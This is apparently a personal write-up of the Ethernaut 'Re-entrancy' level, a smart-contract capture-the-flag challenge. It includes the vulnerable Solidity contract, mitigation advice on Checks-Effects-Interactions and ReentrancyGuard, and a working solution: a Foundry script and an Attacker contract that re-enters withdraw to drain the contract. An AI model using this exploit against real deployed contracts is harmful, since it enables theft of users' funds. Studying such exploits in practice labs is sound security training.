---
title: "Re-entrancy"
date: "2024-02-02"
lastmod: "2024-02-14T16:51:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
prev: "King-8338a297a2b447b3b40166c68586199d"
weight: 11
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/10"
next: "Elevator-59c41c694afa45c68e603000da840a2e"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "6ea65e48-88e3-49da-bdc4-ca12c8e6d22d"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-14T16:51:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel10.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "King-8338a297a2b447b3b40166c68586199d"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "King-8338a297a2b447b3b40166c68586199d"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-02"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 11
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/10"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Elevator-59c41c694afa45c68e603000da840a2e"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Elevator-59c41c694afa45c68e603000da840a2e"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Re-entrancy"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Re-entrancy"
          href: null
  url: "https://www.notion.so/Re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d"
  public_url: null
UPDATE_TIME: "2024-02-14T17:11:07.178Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


The goal of this level is for you to steal all the funds from the contract.


Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```


> 💡 In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.  
> `transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).  
>   
> Always assume that the receiver of the funds you are sending can be   
> another contract, not just a regular address. Hence, it can execute code  
>  in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.  
>   
> Re-entrancy is a common attack. You should always be prepared for it!  
>   
> ### The DAO Hack  
>   
> The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).


### Use the Checks-Effects-Interactions Pattern[](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern)


Most functions will first perform some checks and they should be done first
(who called the function, are the arguments in range, did they send enough Ether,
does the person have tokens, etc.).


As the second step, if all checks passed, effects to the state variables of the current contract should be made.
Interaction with other contracts should be the very last step in any function.


Early contracts delayed some effects and waited for external function calls to return in a non-error state.
This is often a serious mistake because of the reentrancy problem explained above.


Note that, also, calls to known contracts might in turn cause calls to
unknown contracts, so it is probably better to just always apply this pattern.


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker} from "../src/10.sol";

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_10");

        vm.startBroadcast(deployerPrivateKey);

        console.logUint(address(addr).balance);

        Attacker instance = new Attacker(payable(addr));
        instance.attack{value: address(addr).balance}();

        console.logUint(address(addr).balance);

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


interface Reentrance {
  
  function donate(address _to) external payable; 
  function balanceOf(address _who) external view returns (uint balance); 
  function withdraw(uint _amount) external;
  receive() external payable;
}

contract Attacker {

  Reentrance callee;

  constructor(address payable _callee) {
    callee = Reentrance(_callee);
  }

  function attack() public payable {
    uint amount = address(callee).balance;
    callee.donate{value: amount}(address(this));
    callee.withdraw(amount);
  }

  receive() external payable {
    uint amount = address(callee).balance;
		// This check is made to prevent infinite loop
    if (amount != 0) {
      callee.withdraw(amount);
    }
  }
}
```

